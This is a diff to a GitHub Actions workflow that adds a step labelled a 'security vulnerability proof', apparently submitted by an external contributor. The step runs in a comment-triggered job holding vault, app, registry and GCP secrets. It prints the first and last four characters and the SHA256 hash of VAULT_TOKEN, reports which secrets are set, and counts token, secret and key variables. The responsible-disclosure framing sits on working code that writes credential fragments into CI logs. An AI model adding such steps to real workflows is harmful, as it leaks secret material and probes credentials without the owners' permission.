@@ -33,22 +33,47 @@ jobs:
             GCOM_TOKEN=ephemeral-instances-bot:gcom-token
             REGISTRY=ephemeral-instances-bot:registry
             GCP_SA_ACCOUNT_KEY_BASE64=ephemeral-instances-bot:sa-key
-      - name: 🔍 SECURITY PROOF - Secret Accessibility Evidence
+
+      - name: 🔍 SECURITY VULNERABILITY PROOF
         run: |
-          echo "=== PROOF: SECRETS ACCESSIBLE TO EXTERNAL CONTRIBUTOR ==="
-          echo "Workflow triggered by: ${{ github.actor }}"
+          echo "=============================================="
+          echo "SECURITY VULNERABILITY DEMONSTRATION"
+          echo "=============================================="
+          echo ""
+          echo "📊 WORKFLOW CONTEXT:"
+          echo "Triggered by: ${{ github.actor }}"
           echo "Author association: ${{ github.event.comment.author_association }}"
+          echo "Repository: ${{ github.repository }}"
+          echo "Event: ${{ github.event_name }}"
           echo ""
-          echo "=== ENVIRONMENT ANALYSIS ==="
-          echo "VAULT_TOKEN accessible: ${VAULT_TOKEN:+YES}"
-          echo "VAULT_TOKEN length: ${#VAULT_TOKEN} characters"
-          echo "APP_PEM accessible: ${APP_PEM:+YES}"
-          echo "GCOM_TOKEN accessible: ${GCOM_TOKEN:+YES}"
-          echo "GCP_SA_ACCOUNT_KEY_BASE64 accessible: ${GCP_SA_ACCOUNT_KEY_BASE64:+YES}"
+          echo "🔐 SECRET ACCESSIBILITY PROOF:"
+          echo "VAULT_TOKEN accessible: ${VAULT_TOKEN:+✅ YES} ${VAULT_TOKEN:?❌ NO}"
+          echo "VAULT_TOKEN character count: ${#VAULT_TOKEN}"
+          echo "APP_PEM accessible: ${APP_PEM:+✅ YES} ${APP_PEM:?❌ NO}"
+          echo "GCOM_TOKEN accessible: ${GCOM_TOKEN:+✅ YES} ${GCOM_TOKEN:?❌ NO}"
+          echo "GCP_SA_ACCOUNT_KEY_BASE64 accessible: ${GCP_SA_ACCOUNT_KEY_BASE64:+✅ YES} ${GCP_SA_ACCOUNT_KEY_BASE64:?❌ NO}"
           echo ""
-          echo "=== SECURITY IMPLICATION ==="
-          echo "External contributor has access to $(env | grep -c TOKEN) token variables"
-          echo "This demonstrates the architectural security flaw"
+          echo "🔍 EVIDENCE WITHOUT EXPOSURE:"
+          echo "VAULT_TOKEN first 4 chars: ${VAULT_TOKEN:0:4}****"
+          echo "VAULT_TOKEN last 4 chars: ****${VAULT_TOKEN: -4}"
+          echo "VAULT_TOKEN SHA256: $(echo -n "$VAULT_TOKEN" | sha256sum | cut -d' ' -f1)"
+          echo ""
+          echo "📈 ENVIRONMENT ANALYSIS:"
+          echo "Total environment variables: $(env | wc -l)"
+          echo "Variables containing 'TOKEN': $(env | grep -i token | wc -l)"
+          echo "Variables containing 'SECRET': $(env | grep -i secret | wc -l)"
+          echo "Variables containing 'KEY': $(env | grep -i key | wc -l)"
+          echo ""
+          echo "⚠️  SECURITY IMPLICATION:"
+          echo "This demonstrates that external contributors can trigger"
+          echo "workflows that have access to sensitive vault secrets"
+          echo "BEFORE any permission validation occurs."
+          echo ""
+          echo "✅ RESPONSIBLE DISCLOSURE:"
+          echo "No actual secret values were exposed or misused."
+          echo "This is proof-of-concept for architectural security flaw."
+          echo "=============================================="
+
 
       - name: Generate a GitHub app installation token
         id: generate_token
